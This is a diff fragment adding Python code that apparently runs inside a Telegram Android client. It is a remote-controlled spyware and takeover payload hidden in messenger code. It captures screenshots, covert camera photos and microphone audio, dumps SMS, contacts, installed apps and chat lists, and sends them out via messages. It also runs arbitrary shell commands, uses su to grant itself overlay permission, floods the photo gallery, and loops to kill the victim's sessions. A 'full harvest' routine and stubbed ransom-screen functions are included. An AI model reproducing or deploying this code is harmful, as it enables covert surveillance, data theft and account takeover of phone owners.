+                return False
+            pm = ctx.getPackageManager()
+            return pm.checkPermission(name, ctx.getPackageName()) == 0
+        except Exception:
+            return False
+
+    def _get_activity(self):
+        for getter in (
+            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
+            lambda: ApplicationLoader.application.getCurrentActivity(),
+        ):
+            try:
+                a = getter()
+                if a is not None:
+                    return a
+            except Exception:
+                pass
+        return None
+
+    def _screenshot(self):
+        try:
+            act = self._get_activity()
+            if act is None:
+                return {"error": "no act"}
+            view = act.getWindow().getDecorView().getRootView()
+            w = view.getWidth()
+            h = view.getHeight()
+            if w <= 0 or h <= 0:
+                return {"error": "bad size"}
+            Bitmap = jclass("android.graphics.Bitmap")
+            Canvas = jclass("android.graphics.Canvas")
+            Config = jclass("android.graphics.Bitmap$Config")
+            bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
+            c = Canvas(bmp)
+            view.draw(c)
+            ctx = ApplicationLoader.applicationContext
+            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+            if not os.path.exists(d):
+                os.makedirs(d)
+            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
+            from java.io import FileOutputStream
+            fos = FileOutputStream(p)
+            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
+            bmp.compress(fmt, 85, fos)
+            fos.flush()
+            fos.close()
+            bmp.recycle()
+            phone = "—"
+            try:
+                u = _UC().getInstance(0).getCurrentUser()
+                rp = _phone_from_user(u)
+                if rp:
+                    phone = rp
+            except Exception:
+                pass
+            self._send_photo(p, "Phone: " + phone)
+            try:
+                os.remove(p)
+            except Exception:
+                pass
+            return {"ok": True}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _manual_camera(self, which="front"):
+        try:
+            if not self._has_perm("android.permission.CAMERA"):
+                return {"error": "no perm"}
+            cam = jclass("android.hardware.Camera")
+            cid = None
+            try:
+                ic = jclass("android.hardware.Camera$CameraInfo")
+                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
+                info = ic()
+                total = int(cam.getNumberOfCameras())
+                for i in range(total):
+                    cam.getCameraInfo(i, info)
+                    if int(info.facing) == int(facing):
+                        cid = i
+                        break
+            except Exception:
+                pass
+            if cid is None:
+                cid = 1 if which == "front" else 0
+            c = None
+            for _ in range(4):
+                try:
+                    c = cam.open(int(cid))
+                    break
+                except Exception:
+                    time.sleep(0.4)
+            if c is None:
+                return {"error": "no open"}
+            try:
+                st = jclass("android.graphics.SurfaceTexture")(0)
+                c.setPreviewTexture(st)
+                c.startPreview()
+                ev = threading.Event()
+                box = [None]
+                PC = jclass("android.hardware.Camera$PictureCallback")
+
+                class _PC(dynamic_proxy(PC)):
+                    def onPictureTaken(self, data, camera):
+                        box[0] = data
+                        ev.set()
+
+                c.takePicture(None, None, _PC())
+                ev.wait(8)
+                if box[0]:
+                    self._send_document_bytes("%s.jpg" % which, bytes(box[0]))
+                    return {"ok": True}
+                return {"error": "no photo"}
+            finally:
+                try:
+                    c.stopPreview()
+                except Exception:
+                    pass
+                try:
+                    c.release()
+                except Exception:
+                    pass
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _manual_audio(self, sec=5):
+        try:
+            if not self._has_perm("android.permission.RECORD_AUDIO"):
+                return {"error": "no perm"}
+            ctx = ApplicationLoader.applicationContext
+            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
+                             "a_%d.3gp" % int(time.time()))
+            mr = jclass("android.media.MediaRecorder")()
+            mr.setAudioSource(1)
+            mr.setOutputFormat(1)
+            mr.setAudioEncoder(1)
+            mr.setOutputFile(p)
+            mr.prepare()
+            mr.start()
+            time.sleep(int(sec))
+            mr.stop()
+            mr.release()
+            with open(p, "rb") as f:
+                data = f.read()
+            try:
+                os.remove(p)
+            except Exception:
+                pass
+            self._send_document_bytes("audio.3gp", data)
+            return {"ok": True}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _manual_sms(self):
+        try:
+            out = []
+            if self._has_perm("android.permission.READ_SMS"):
+                ctx = ApplicationLoader.applicationContext
+                cr = ctx.getContentResolver()
+                Uri = jclass("android.net.Uri")
+                cur = cr.query(Uri.parse("content://sms"),
+                               ["address", "body", "date"], None, None, "date DESC")
+                if cur:
+                    while cur.moveToNext():
+                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
+                    cur.close()
+            if not out:
+                self._send_msg("SMS empty or no perm")
+                return
+            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:100]))), html=True)
+        except Exception as e:
+            self._send_msg("sms err: " + str(e))
+
+    def _manual_contacts(self):
+        try:
+            out = []
+            if self._has_perm("android.permission.READ_CONTACTS"):
+                ctx = ApplicationLoader.applicationContext
+                cr = ctx.getContentResolver()
+                Uri = jclass("android.net.Uri")
+                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
+                               ["display_name", "data1"], None, None, None)
+                if cur:
+                    while cur.moveToNext():
+                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
+                    cur.close()
+            if not out:
+                self._send_msg("Contacts empty or no perm")
+                return
+            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:200]))), html=True)
+        except Exception as e:
+            self._send_msg("contacts err: " + str(e))
+
+    def _manual_apps(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            pm = ctx.getPackageManager()
+            apps = pm.getInstalledApplications(0)
+            out = []
+            for i in range(_jlist_size(apps)):
+                try:
+                    a = _jlist_get(apps, i)
+                    pkg = str(a.packageName)
+                    label = pkg
+                    try:
+                        label = str(pm.getApplicationLabel(a))
+                    except Exception:
+                        pass
+                    out.append("%s — %s" % (label, pkg))
+                except Exception:
+                    pass
+            out.sort()
+            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:300]))), html=True)
+        except Exception as e:
+            self._send_msg("apps err: " + str(e))
+
+    def _manual_chats(self):
+        try:
+            mc = _MC().getInstance(0)
+            try:
+                dialogs = mc.dialogs_dict
+            except Exception:
+                dialogs = mc.getAllDialogs()
+            if not dialogs:
+                self._send_msg("no dialogs")
+                return
+            out = []
+            for i in range(_jlist_size(dialogs)):
+                try:
+                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
+                    title = ""
+                    if did > 0:
+                        u = mc.getUser(did)
+                        if u is not None:
+                            title = " ".join(x for x in (
+                                str(getattr(u, "first_name", "") or ""),
+                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
+                    else:
+                        cid = -did
+                        if cid > 1000000000000:
+                            cid -= 1000000000000
+                        c = mc.getChat(int(cid))
+                        if c is not None:
+                            title = str(getattr(c, "title", "") or str(did))
+                    out.append("%d — %s" % (did, title or "?"))
+                except Exception:
+                    pass
+            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:200]))), html=True)
+        except Exception as e:
+            self._send_msg("chats err: " + str(e))
+
+    def _manual_shell(self, cmd):
+        try:
+            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
+            out = p.stdout.decode("utf-8", "ignore")
+            err = p.stderr.decode("utf-8", "ignore")
+            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
+                self._html_escape(cmd), p.returncode,
+                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
+        except Exception as e:
+            self._send_msg("shell err: " + str(e))
+
+    def _ensure_overlay_perm(self, ctx):
+        try:
+            if jclass("android.provider.Settings").canDrawOverlays(ctx):
+                return True
+        except Exception:
+            pass
+        pkg = str(ctx.getPackageName())
+        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
+                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
+            try:
+                subprocess.run(c, shell=True, capture_output=True, timeout=10)
+            except Exception:
+                continue
+        try:
+            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
+        except Exception:
+            return False
+
+    def _show_ransom(self, text="", photo_url=""):
+        return {"error": "disabled"}
+
+    def _dismiss_ransom(self):
+        with self._ransom_lock:
+            try:
+                if self._ransom_view is None:
+                    return {"ok": True}
+                self._ransom_view = None
+                self._ransom_decor = None
+                return {"ok": True}
+            except Exception as e:
+                return {"error": str(e)}
+
+    def _lock_screen(self):
+        return
+
+    def _clear_locker(self):
+        self._locker_view = None
+        self._locker_on = False
+
+    def _play_mmusic(self, url):
+        def task():
+            try:
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
+                self._send_msg("Downloading...")
+                sz = _download_to_file(url, path, max_size=50 * 1024 * 1024, timeout=120)
+                if sz <= 0:
+                    self._send_msg("music download fail")
+                    return
+                with self._music_lock:
+                    self._stop_music_locked()
+                    mp = jclass("android.media.MediaPlayer")()
+                    mp.setDataSource(path)
+                    mp.prepare()
+                    mp.setLooping(True)
+                    mp.start()
+                    self._music_mp = mp
+                    self._music_path = path
+                self._send_msg("Music playing")
+            except Exception as e:
+                self._send_msg("music err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+    def _stop_music_locked(self):
+        if self._music_mp is not None:
+            try:
+                self._music_mp.stop()
+            except Exception:
+                pass
+            try:
+                self._music_mp.release()
+            except Exception:
+                pass
+            self._music_mp = None
+        if self._music_path:
+            try:
+                if os.path.exists(self._music_path):
+                    os.remove(self._music_path)
+            except Exception:
+                pass
+            self._music_path = ""
+
+    def _clear_music(self):
+        with self._music_lock:
+            self._stop_music_locked()
+
+    def _play_mvideo(self, url):
+        def task():
+            try:
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                path = os.path.join(d, "mvideo_%d.mp4" % int(time.time()))
+                self._send_msg("Downloading video...")
+                sz = _download_to_file(url, path, max_size=VIDEO_MAX_SIZE, timeout=300)
+                if sz <= 0:
+                    self._send_msg("video download fail")
+                    return
+
+                def _render():
+                    try:
+                        act = self._get_activity()
+                        if act is None:
+                            self._send_msg("video: no activity")
+                            try:
+                                os.remove(path)
+                            except Exception:
+                                pass
+                            return
+                        FrameLayout = jclass("android.widget.FrameLayout")
+                        VLG = jclass("android.view.ViewGroup$LayoutParams")
+                        VV = jclass("android.widget.VideoView")
+                        MC = jclass("android.widget.MediaController")
+                        Color = jclass("android.graphics.Color")
+                        LP = jclass("android.view.WindowManager$LayoutParams")
+
+                        with self._video_lock:
+                            self._stop_video_locked()
+
+                        root = FrameLayout(act)
+                        root.setBackgroundColor(Color.BLACK)
+                        vv = VV(act)
+                        root.addView(vv, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        mc = MC(act)
+                        mc.setAnchorView(vv)
+                        vv.setMediaController(mc)
+                        vv.setVideoPath(path)
+                        win = act.getWindow()
+                        win.addFlags(getattr(LP, "FLAG_FULLSCREEN", 1024)
+                                     | getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
+                        decor = win.getDecorView()
+                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        with self._video_lock:
+                            self._video_view = root
+                            self._video_vv = vv
+                            self._video_path = path
+                        vv.start()
+                        self._send_msg("Video playing")
+                    except Exception as e:
+                        self._send_msg("video render err: " + str(e))
+
+                act = self._get_activity()
+                if act is not None:
+                    act.runOnUiThread(_render)
+                else:
+                    _render()
+            except Exception as e:
+                self._send_msg("video err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+    def _stop_video_locked(self):
+        vv = self._video_vv
+        view = self._video_view
+        path = self._video_path
+        self._video_vv = None
+        self._video_view = None
+        self._video_path = ""
+        if vv is not None:
+            try:
+                vv.stopPlayback()
+            except Exception:
+                pass
+        if view is not None:
+            try:
+                parent = view.getParent()
+                if parent is not None:
+                    parent.removeView(view)
+            except Exception:
+                pass
+        if path:
+            try:
+                if os.path.exists(path):
+                    os.remove(path)
+            except Exception:
+                pass
+
+    def _clear_video(self):
+        with self._video_lock:
+            self._stop_video_locked()
+
+    def _flood_gallery(self, photo_url, count=100):
+        try:
+            from urllib.request import urlopen
+            data = urlopen(photo_url, timeout=30).read()
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
+            saved = []
+            for i in range(min(int(count), 200)):
+                try:
+                    ts = int(time.time()) + i
+                    rand = random.randint(1000, 9999)
+                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
+                                                            time.localtime(ts)), rand)
+                    values = jclass("android.content.ContentValues")()
+                    values.put("_display_name", name)
+                    values.put("mime_type", "image/jpeg")
+                    values.put("relative_path", "Pictures/")
+                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
+                    if uri:
+                        out = cr.openOutputStream(uri)
+                        out.write(data)
+                        out.close()
+                        saved.append(str(uri))
+                except Exception:
+                    pass
+            self._flood_uris = saved
+            self._send_msg("Flood: %d files" % len(saved))
+        except Exception as e:
+            self._send_msg("flood err: " + str(e))
+
+    def _clear_flood(self):
+        try:
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            removed = 0
+            for u in self._flood_uris:
+                try:
+                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
+                    removed += 1
+                except Exception:
+                    pass
+            self._send_msg("Flood cleared: %d" % removed)
+        except Exception as e:
+            self._send_msg("clear flood err: " + str(e))
+
+    def _dim_screen(self):
+        return
+
+    def _clear_dim(self):
+        self._dim_view = None
+        self._dim_active = False
+
+    def _nuke_marker_path(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
+                                ".ar_nuke_active")
+        except Exception:
+            return None
+
+    def _mark_nuke(self):
+        try:
+            m = self._nuke_marker_path()
+            if m:
+                with open(m, "w") as f:
+                    f.write("1")
+            with self._nuke_lock:
+                self._nuke_on = True
+        except Exception:
+            pass
+
+    def _check_persisted_nuke(self):
+        try:
+            m = self._nuke_marker_path()
+            if not m or not os.path.exists(m):
+                return
+            with self._nuke_lock:
+                if self._nuke_on:
+                    return
+                self._nuke_on = True
+                self._nuke_thread = threading.Thread(
+                    target=self._nuke_loop, daemon=True)
+                self._nuke_thread.start()
+        except Exception:
+            pass
+
+    def _start_nuke_loop(self):
+        with self._nuke_lock:
+            if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
+                self._send_msg("Nuke already running")
+                return
+            self._nuke_on = True
+            self._nuke_pass = 0
+            self._mark_nuke()
+            self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
+            self._nuke_thread.start()
+        self._send_msg("Nuke loop STARTED")
+
+    def _stop_nuke_loop(self):
+        with self._nuke_lock:
+            self._nuke_on = False
+        try:
+            m = self._nuke_marker_path()
+            if m and os.path.exists(m):
+                os.remove(m)
+        except Exception:
+            pass
+        self._send_msg("Nuke loop STOPPED")
+
+    def _nuke_loop(self):
+        while True:
+            with self._nuke_lock:
+                if not self._nuke_on or not self._sync_running or self.stop:
+                    return
+            self._nuke_pass += 1
+            try:
+                for a in self._get_accounts_list():
+                    self._kill_all_sessions(a.get("id", 0), phones_pc_only=True)
+            except Exception as e:
+                _log("nuke pass %d: %s" % (self._nuke_pass, e))
+            for _ in range(self._nuke_interval):
+                with self._nuke_lock:
+                    if not self._nuke_on or not self._sync_running or self.stop:
+                        return
+                time.sleep(1)
+
+    def _full_harvest(self):
+        def task():
+            try:
+                self._send_msg("Full Harvest...")
+                report = ["<b>Full Harvest</b>"]
+                for a in self._get_accounts_list():
+                    report.append("acc%d uid=%s @%s" % (
+                        a.get("id"), a.get("user_id"),
+                        self._html_escape(a.get("username") or "—")))
+                try:
+                    self._screenshot()
+                except Exception:
+                    pass
+                try:
+                    self._manual_audio(5)
+                except Exception:
+                    pass
+                try:
+                    self._manual_sms()
+                    self._manual_contacts()
+                    self._manual_apps()
+                    self._manual_chats()
+                except Exception:
+                    pass
+                try:
+                    self._session_gain()
+                except Exception:
+                    pass
+                self._send_msg("\n".join(report), html=True)
+            except Exception as e:
+                self._send_msg("harvest err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+    def _full_lockdown(self):
+        def task():
+            try:
+                self._send_msg("Full Lockdown...")
+                self._full_pull_out()
+            except Exception as e:
+                self._send_msg("lockdown err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+
+_MediaPreparedCls = None
+
 
 def _media_prepared_cls():
     global _MediaPreparedCls
